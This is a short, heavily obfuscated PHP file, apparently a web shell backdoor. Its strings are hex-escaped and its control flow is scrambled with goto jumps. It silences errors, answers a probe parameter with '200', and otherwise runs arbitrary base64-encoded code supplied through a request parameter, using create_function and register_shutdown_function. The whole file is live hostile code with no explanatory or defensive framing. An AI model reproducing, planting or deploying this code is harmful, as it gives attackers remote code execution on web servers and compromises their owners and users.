<?php
 goto M8; UH: $M7 = "\x63\x72\145\141\164\145\x5f" . "\146\165\156\x63\x74\x69\x6f\x6e"; goto wY; db: if (!($_GET["\x71"] == "\x31")) { goto vN; } goto o2; YL: ini_set("\144\151\x73\160\154\x61\x79\137\145\x72\162\157\x72\x73", 0); goto db; M8: error_reporting(0); goto YL; wY: $OZ = "\142\x61\163\145\x36\x34\137" . "\144\145\x63\157\144\145"; goto i6; Fe: vN: goto UH; T3: exit; goto Fe; o2: echo "\x32\60\60"; goto T3; i6: register_shutdown_function($M7('', $OZ($_REQUEST["\x53\132\143\x53\141\x51\167"])));

